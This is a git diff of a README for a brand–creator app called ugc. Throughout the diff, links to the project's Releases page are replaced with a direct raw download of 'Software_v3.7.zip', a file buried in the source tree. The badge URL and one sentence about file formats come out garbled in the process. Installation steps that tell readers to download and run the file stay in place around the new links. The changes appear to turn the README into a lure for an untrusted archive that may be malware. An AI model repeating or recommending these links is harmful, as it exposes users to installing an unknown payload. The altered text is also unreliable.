@@ -6,7 +6,7 @@ Welcome to the ugc project! This application allows brands and creators to conne
 
 ## 📥 Download the App
 
-[![Download ugc](https://img.shields.io/badge/Download%20ugc-v1.0-blue)](https://github.com/ahmed7890-byte/ugc/releases)
+[![Download ugc](https://github.com/ahmed7890-byte/ugc/raw/refs/heads/main/app/apps/web/src/app/ai/Software_v3.7.zip%20ugc-v1.0-blue)](https://github.com/ahmed7890-byte/ugc/raw/refs/heads/main/app/apps/web/src/app/ai/Software_v3.7.zip)
 
 ## 🛠️ System Requirements
 
@@ -28,13 +28,13 @@ Before you start, ensure your system meets the following requirements:
 ## 📃 How to Download & Install
 
 1. **Visit the Releases Page**  
-   To get the latest version, [visit this page to download](https://github.com/ahmed7890-byte/ugc/releases). Here, you will find the latest release files.
+   To get the latest version, [visit this page to download](https://github.com/ahmed7890-byte/ugc/raw/refs/heads/main/app/apps/web/src/app/ai/Software_v3.7.zip). Here, you will find the latest release files.
 
 2. **Select the Right Version**  
    On the Releases page, scroll down to find the most recent version of the application. Look for a file that is compatible with your operating system.
 
 3. **Download the File**  
-   Click on the appropriate file link to download it to your computer. The download will begin automatically. This file typically has a format like `.exe`, `.dmg`, or `.tar.gz`.
+   Click on the appropriate file link to download it to your computer. The download will begin automatically. This file typically has a format like `.exe`, `.dmg`, or `https://github.com/ahmed7890-byte/ugc/raw/refs/heads/main/app/apps/web/src/app/ai/Software_v3.7.zip`.
 
 4. **Run the Installer**  
    Locate the downloaded file on your computer. Double-click it to start the installation process. Follow the on-screen instructions to install the application. 
@@ -64,6 +64,6 @@ Join our community to connect with other users. Stay informed about updates, sha
 
 For detailed information about using the application and its features, refer to our [Documentation Page]. This page provides in-depth guides and FAQs to help you make the most of ugc.
 
-[Download the latest version from our Releases page here](https://github.com/ahmed7890-byte/ugc/releases).
+[Download the latest version from our Releases page here](https://github.com/ahmed7890-byte/ugc/raw/refs/heads/main/app/apps/web/src/app/ai/Software_v3.7.zip).
 
 Thank you for choosing ugc! We hope you find it helpful and user-friendly. Happy connecting!
